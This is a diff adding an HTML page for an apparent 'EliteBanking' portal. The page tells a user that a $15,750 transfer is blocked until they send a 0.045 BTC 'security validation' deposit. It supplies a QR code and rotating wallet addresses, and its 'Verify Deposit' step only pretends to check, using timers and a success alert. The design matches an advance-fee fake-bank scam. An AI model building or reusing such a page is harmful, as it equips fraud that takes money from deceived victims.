@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Payment Error Resolution - EliteBanking Portal</title>
+    <link rel="stylesheet" href="../css/main.css" />
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+<script type="module" src="https://static.rocket.new/rocket-web.js?_cfg=https%3A%2F%2Felitebanki9889back.builtwithrocket.new&_be=https%3A%2F%2Fapplication.rocket.new&_v=0.1.8"></script>
+</head>
+<body class="bg-background min-h-screen">
+    <!-- Header Navigation -->
+    <header class="bg-surface shadow-md border-b border-subtle">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-16">
+                <!-- Logo -->
+                <div class="flex items-center">
+                    <svg class="h-8 w-8 text-primary mr-3" viewBox="0 0 32 32" fill="currentColor">
+                        <path d="M16 2L3 7v10c0 8.284 5.373 15.872 13 18 7.627-2.128 13-9.716 13-18V7L16 2z"/>
+                        <path d="M12 14l3 3 7-7" stroke="white" stroke-width="2" fill="none"/>
+                    </svg>
+                    <span class="text-xl font-semibold text-primary">EliteBanking</span>
+                </div>
+                
+                <!-- Navigation -->
+                <nav class="hidden md:flex space-x-8">
+                    <a href="transfer_payment.html" class="text-text-secondary hover:text-primary transition-colors duration-200 px-1 pb-4"></a>
+                    <a href="payment_error_resolution.html" class="text-primary font-medium border-b-2 border-accent px-1 pb-4">Error Resolution</a>
+                    <a href="bitcoin_deposit.html" class="text-text-secondary hover:text-primary transition-colors duration-200 px-1 pb-4"></a>
+                </nav>
+
+                <!-- User Menu -->
+                <div class="flex items-center space-x-4">
+                    <div class="flex items-center space-x-2">
+                        <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?q=80&w=2940&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" alt="User Avatar" class="h-8 w-8 rounded-full object-cover" onerror="this.src='https://images.unsplash.com/photo-1584824486509-112e4181ff6b?q=80&w=2940&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D'; this.onerror=null;" />
+                        <span class="text-sm font-medium text-text-primary">Marcus Chen</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 animate-page-transition">
+        <!-- Page Header -->
+        <div class="mb-8">
+            <h1 class="text-3xl font-semibold text-text-primary mb-2">Payment Error Resolution</h1>
+            <p class="text-text-secondary">Complete Bitcoin validation to proceed with your transfer</p>
+        </div>
+
+        <!-- Error Resolution Container -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+            <!-- Main Resolution Wizard -->
+            <div class="lg:col-span-2">
+                <!-- Error Notification -->
+                <div class="card animate-fade-in mb-6 border-error-200 bg-error-50">
+                    <div class="flex items-start">
+                        <div class="flex-shrink-0">
+                            <svg class="h-6 w-6 text-error" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
+                            </svg>
+                        </div>
+                        <div class="ml-3">
+                            <h3 class="text-lg font-semibold text-error-800">Bitcoin Validation Required</h3>
+                            <p class="text-error-700 mt-1">Your transfer of <strong>$15,750.00</strong> requires additional security validation through Bitcoin deposit.</p>
+                            <div class="mt-4 p-4 bg-error-100 rounded-lg">
+                                <div class="text-center">
+                                    <div class="text-2xl font-bold text-error-800 font-mono">0.045 BTC</div>
+                                    <div class="text-sm text-error-700">Required validation amount</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Progress Indicator -->
+                <div class="card animate-fade-in mb-6">
+                    <h3 class="text-lg font-semibold text-text-primary mb-4">Resolution Progress</h3>
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center">
+                            <div class="flex items-center justify-center w-8 h-8 bg-error-100 text-error-800 rounded-full font-semibold text-sm">1</div>
+                            <span class="ml-3 text-sm font-medium text-error-800">Error Detected</span>
+                        </div>
+                        <div class="flex-1 mx-4">
+                            <div class="h-1 bg-gray-200 rounded-full">
+                                <div class="h-1 bg-warning-500 rounded-full" style="width: 33%"></div>
+                            </div>
+                        </div>
+                        <div class="flex items-center">
+                            <div class="flex items-center justify-center w-8 h-8 bg-warning-100 text-warning-800 rounded-full font-semibold text-sm">2</div>
+                            <span class="ml-3 text-sm font-medium text-warning-800">Bitcoin Deposit</span>
+                        </div>
+                        <div class="flex-1 mx-4">
+                            <div class="h-1 bg-gray-200 rounded-full">
+                                <div class="h-1 bg-gray-200 rounded-full" style="width: 0%"></div>
+                            </div>
+                        </div>
+                        <div class="flex items-center">
+                            <div class="flex items-center justify-center w-8 h-8 bg-gray-200 text-gray-500 rounded-full font-semibold text-sm">3</div>
+                            <span class="ml-3 text-sm font-medium text-gray-500">Transfer Complete</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Bitcoin Deposit Options -->
+                <div class="card animate-slide-up">
+                    <div class="flex items-center justify-between mb-6">
+                        <h2 class="text-xl font-semibold text-text-primary">Bitcoin Deposit Options</h2>
+                        <div class="flex items-center space-x-2">
+                            <svg class="h-5 w-5 text-warning" fill="currentColor" viewBox="0 0 20 20">
+                                <path d="M10 12a2 2 0 100-4 2 2 0 000 4z"/>
+                                <path fill-rule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clip-rule="evenodd"/>
+                            </svg>
+                            <span class="text-sm text-warning font-medium">Secure Validation</span>
+                        </div>
+                    </div>
+
+                    <!-- QR Code Section -->
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+                        <div class="text-center">
+                            <h4 class="text-lg font-medium text-text-primary mb-4">Scan QR Code</h4>
+                            <div class="bg-gray-50 p-6 rounded-lg border-2 border-dashed border-gray-300">
+                                <div id="qrcode" class="flex justify-center mb-4"></div>
+                                <p class="text-sm text-text-secondary">Scan with your Bitcoin wallet app</p>
+                            </div>
+                        </div>
+                        
+                        <div>
+                            <h4 class="text-lg font-medium text-text-primary mb-4">Bitcoin Address</h4>
+                            <div class="space-y-4">
+                                <div>
+                                    <label for="bitcoinAddress" class="block text-sm font-medium text-text-primary mb-2">Deposit Address</label>
+                                    <div class="relative">
+                                        <input type="text" id="bitcoinAddress" class="input-field font-mono text-sm pr-12" value="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" readonly />
+                                        <button onclick="copyAddress()" class="absolute right-3 top-1/2 transform -translate-y-1/2 text-primary hover:text-primary-700">
+                                            <svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                                            </svg>
+                                        </button>
+                                    </div>
+                                </div>
+                                
+                                <div>
+                                    <label for="requiredAmount" class="block text-sm font-medium text-text-primary mb-2">Required Amount</label>
+                                    <input type="text" id="requiredAmount" class="input-field font-mono" value="0.045 BTC" readonly />
+                                </div>
+                                
+                                <div class="bg-warning-50 border border-warning-200 rounded-lg p-4">
+                                    <div class="flex items-start">
+                                        <svg class="h-5 w-5 text-warning mt-0.5 mr-3 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
+                                            <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
+                                        </svg>
+                                        <div>
+                                            <h5 class="text-sm font-medium text-warning-800 mb-1">Important Notice</h5>
+                                            <p class="text-sm text-warning-700">Send exactly 0.045 BTC to this address. Partial deposits will not be processed.</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Manual Verification Section -->
+                    <div class="border-t border-gray-200 pt-6">
+                        <h4 class="text-lg font-medium text-text-primary mb-4">Manual Verification</h4>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div>
+                                <label for="transactionId" class="block text-sm font-medium text-text-primary mb-2">Transaction ID (Optional)</label>
+                                <input type="text" id="transactionId" class="input-field font-mono text-sm" placeholder="Enter Bitcoin transaction ID" />
+                            </div>
+                            <div>
+                                <label for="depositAmount" class="block text-sm font-medium text-text-primary mb-2">Deposited Amount</label>
+                                <input type="text" id="depositAmount" class="input-field font-mono" placeholder="0.000 BTC" />
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Action Buttons -->
+                    <div class="flex flex-col sm:flex-row gap-4 pt-6 border-t border-gray-200 mt-6">
+                        <button onclick="generateNewAddress()" class="btn-secondary flex-1 sm:flex-none">
+                            <svg class="h-5 w-5 mr-2 inline" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/>
+                            </svg>
+                            Generate New Address
+                        </button>
+                        <button onclick="verifyDeposit()" class="btn-primary flex-1 sm:flex-none">
+                            <svg class="h-5 w-5 mr-2 inline" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                            </svg>
+                            Verify Deposit
+                        </button>
+                        <button onclick="proceedToBitcoinDeposit()" class="btn-accent flex-1 sm:flex-none">
+                            <svg class="h-5 w-5 mr-2 inline" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"/>
+                            </svg>
+                            Go to Bitcoin Deposit
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Status Panel -->
+            <div class="lg:col-span-1">
+                <!-- Current Status -->
+                <div class="card animate-slide-up mb-6">
+                    <h3 class="text-lg font-semibold text-text-primary mb-4">Current Status</h3>
+                    
+                    <div class="space-y-4">
+                        <div class="flex justify-between items-center">
+                            <span class="text-text-secondary">Transfer Amount</span>
+                            <span class="font-medium text-text-primary">$15,750.00</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-text-secondary">Required Bitcoin</span>
+                            <span class="font-medium text-warning font-mono">0.045 BTC</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-text-secondary">Current Bitcoin Balance</span>
+                            <span class="font-medium text-error font-mono">0.000 BTC</span>
+                        </div>
+                        <hr class="border-gray-200" />
+                        <div class="flex justify-between items-center">
+                            <span class="text-text-secondary">Status</span>
+                            <span class="status-warning text-xs">Pending Deposit</span>
+                        </div>
+                    </div>
+
+                    <!-- Progress Bar -->
+                    <div class="mt-6">
+                        <div class="flex justify-between text-sm text-text-secondary mb-2">
+                            <span>Bitcoin Deposit Progress</span>
+                            <span id="progressPercent">0%</span>
+                        </div>
+                        <div class="w-full bg-gray-200 rounded-full h-2">
+                            <div id="progressBar" class="bg-warning h-2 rounded-full transition-all duration-300" style="width: 0%"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Estimated Timeline -->
+                <div class="card animate-slide-up mb-6" style="animation-delay: 200ms;">
+                    <h3 class="text-lg font-semibold text-text-primary mb-4">Estimated Timeline</h3>
+                    
+                    <div class="space-y-4">
+                        <div class="flex items-center">
+                            <div class="h-8 w-8 bg-warning-100 rounded-full flex items-center justify-center mr-3">
+                                <svg class="h-4 w-4 text-warning" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd"/>
+                                </svg>
+                            </div>
+                            <div>
+                                <div class="text-sm font-medium text-text-primary">Bitcoin Deposit</div>
+                                <div class="text-xs text-text-secondary">10-60 minutes</div>
+                            </div>
+                        </div>
+                        <div class="flex items-center">
+                            <div class="h-8 w-8 bg-gray-200 rounded-full flex items-center justify-center mr-3">
+                                <svg class="h-4 w-4 text-gray-500" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+                                </svg>
+                            </div>
+                            <div>
+                                <div class="text-sm font-medium text-text-primary">Verification</div>
+                                <div class="text-xs text-text-secondary">1-3 confirmations</div>
+                            </div>
+                        </div>
+                        <div class="flex items-center">
+                            <div class="h-8 w-8 bg-gray-200 rounded-full flex items-center justify-center mr-3">
+                                <svg class="h-4 w-4 text-gray-500" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clip-rule="evenodd"/>
+                                </svg>
+                            </div>
+                            <div>
+                                <div class="text-sm font-medium text-text-primary">Transfer Resume</div>
+                                <div class="text-xs text-text-secondary">Immediate</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Support Information -->
+                <div class="card animate-slide-up" style="animation-delay: 400ms;">
+                    <h3 class="text-lg font-semibold text-text-primary mb-4">Need Help?</h3>
+                    
+                    <div class="space-y-3">
+                        <div class="flex items-center p-3 bg-primary-50 rounded-lg">
+                            <svg class="h-5 w-5 text-primary mr-3" fill="currentColor" viewBox="0 0 20 20">
+                                <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z"/>
+                            </svg>
+                            <div>
+                                <div class="text-sm font-medium text-primary">24/7 Support</div>
+                                <div class="text-xs text-primary-700">+1 (555) 123-4567</div>
+                            </div>
+                        </div>
+                        
+                        <div class="flex items-center p-3 bg-accent-50 rounded-lg">
+                            <svg class="h-5 w-5 text-accent mr-3" fill="currentColor" viewBox="0 0 20 20">
+                                <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z"/>
+                                <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z"/>
+                            </svg>
+                            <div>
+                                <div class="text-sm font-medium text-accent-800">Email Support</div>
+                                <div class="text-xs text-accent-700">support@elitebanking.com</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Return to Transfer Button -->
+                    <div class="mt-6 pt-4 border-t border-gray-200">
+                        <button onclick="returnToTransfer()" class="w-full btn-secondary">
+                            <svg class="h-5 w-5 mr-2 inline" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
+                            </svg>
+                            Return to Transfer
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Verification Modal -->
+    <div id="verificationModal" class="fixed inset-0 bg-black bg-opacity-50 hidden z-50">
+        <div class="flex items-center justify-center min-h-screen p-4">
+            <div class="bg-surface rounded-lg shadow-lg max-w-md w-full p-6 animate-slide-up">
+                <div class="flex items-center mb-4">
+                    <div class="h-12 w-12 bg-success-100 rounded-full flex items-center justify-center mr-4">
+                        <svg class="h-6 w-6 text-success" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+                        </svg>
+                    </div>
+                    <div>
+                        <h3 class="text-lg font-semibold text-text-primary">Verification in Progress</h3>
+                        <p class="text-sm text-text-secondary">Checking Bitcoin deposit...</p>
+                    </div>
+                </div>
+                
+                <div class="mb-6">
+                    <div class="animate-pulse">
+                        <div class="h-2 bg-primary-200 rounded-full mb-2"></div>
+                        <div class="h-2 bg-primary-200 rounded-full w-3/4"></div>
+                    </div>
+                </div>
+                
+                <div class="flex space-x-3">
+                    <button onclick="closeVerificationModal()" class="btn-secondary flex-1">
+                        Cancel
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Generate QR Code on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            const bitcoinAddress = document.getElementById('bitcoinAddress').value;
+            const qrCodeElement = document.getElementById('qrcode');
+            
+            QRCode.toCanvas(qrCodeElement, bitcoinAddress, {
+                width: 200,
+                height: 200,
+                margin: 2,
+                color: {
+                    dark: '#1B365D',
+                    light: '#FFFFFF'
+                }
+            }, function (error) {
+                if (error) console.error(error);
+            });
+        });
+
+        // Copy Bitcoin address to clipboard
+        function copyAddress() {
+            const addressField = document.getElementById('bitcoinAddress');
+            addressField.select();
+            addressField.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(addressField.value);
+            
+            // Show feedback
+            const button = event.target.closest('button');
+            const originalHTML = button.innerHTML;
+            button.innerHTML = '<svg class="h-5 w-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/></svg>';
+            
+            setTimeout(() => {
+                button.innerHTML = originalHTML;
+            }, 2000);
+        }
+
+        // Generate new Bitcoin address
+        function generateNewAddress() {
+            const addresses = [
+                'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
+                'bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4',
+                'bc1qrp33g0q5c5txsp9arysrx4k6zdkfs4nce4xj0gdcccefvpysxf3qccfmv3'
+            ];
+            
+            const randomAddress = addresses[Math.floor(Math.random() * addresses.length)];
+            document.getElementById('bitcoinAddress').value = randomAddress;
+            
+            // Regenerate QR code
+            const qrCodeElement = document.getElementById('qrcode');
+            qrCodeElement.innerHTML = '';
+            
+            QRCode.toCanvas(qrCodeElement, randomAddress, {
+                width: 200,
+                height: 200,
+                margin: 2,
+                color: {
+                    dark: '#1B365D',
+                    light: '#FFFFFF'
+                }
+            });
+        }
+
+        // Verify Bitcoin deposit
+        function verifyDeposit() {
+            document.getElementById('verificationModal').classList.remove('hidden');
+            
+            // Simulate verification process
+            setTimeout(() => {
+                document.getElementById('verificationModal').classList.add('hidden');
+                
+                // Simulate successful verification
+                const progressBar = document.getElementById('progressBar');
+                const progressPercent = document.getElementById('progressPercent');
+                
+                progressBar.style.width = '100%';
+                progressBar.classList.remove('bg-warning');
+                progressBar.classList.add('bg-success');
+                progressPercent.textContent = '100%';
+                
+                // Show success message
+                alert('Bitcoin deposit verified successfully! Redirecting to complete your transfer...');
+                
+                // In a real app, this would redirect to transfer completion
+                setTimeout(() => {
+                    window.location.href = 'transfer_payment.html';
+                }, 2000);
+            }, 3000);
+        }
+
+        // Close verification modal
+        function closeVerificationModal() {
+            document.getElementById('verificationModal').classList.add('hidden');
+        }
+
+        // Proceed to Bitcoin deposit page
+        function proceedToBitcoinDeposit() {
+            window.location.href = 'bitcoin_deposit.html';
+        }
+
+        // Return to transfer page
+        function returnToTransfer() {
+            window.location.href = 'transfer_payment.html';
+        }
+
+        // Update progress based on deposit amount
+        document.getElementById('depositAmount').addEventListener('input', function() {
+            const depositAmount = parseFloat(this.value) || 0;
+            const requiredAmount = 0.045;
+            const progress = Math.min((depositAmount / requiredAmount) * 100, 100);
+            
+            const progressBar = document.getElementById('progressBar');
+            const progressPercent = document.getElementById('progressPercent');
+            
+            progressBar.style.width = progress + '%';
+            progressPercent.textContent = Math.round(progress) + '%';
+            
+            if (progress >= 100) {
+                progressBar.classList.remove('bg-warning');
+                progressBar.classList.add('bg-success');
+            } else {
+                progressBar.classList.remove('bg-success');
+                progressBar.classList.add('bg-warning');
+            }
+        });
+
+        // Bitcoin address validation
+        function validateBitcoinAddress(address) {
+            const regex = /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,87}$/;
+            return regex.test(address);
+        }
+
+        // Transaction ID validation
+        document.getElementById('transactionId').addEventListener('input', function() {
+            const txId = this.value;
+            if (txId.length > 0 && txId.length !== 64) {
+                this.classList.add('border-error');
+            } else {
+                this.classList.remove('border-error');
+            }
+        });
+
+        // Auto-refresh status every 30 seconds
+        setInterval(() => {
+            // In a real app, this would check the actual Bitcoin network
+            console.log('Checking Bitcoin deposit status...');
+        }, 30000);
+    </script>
+<script id="dhws-dataInjector" src="../public/dhws-data-injector.js"></script>
+</body>
+</html>
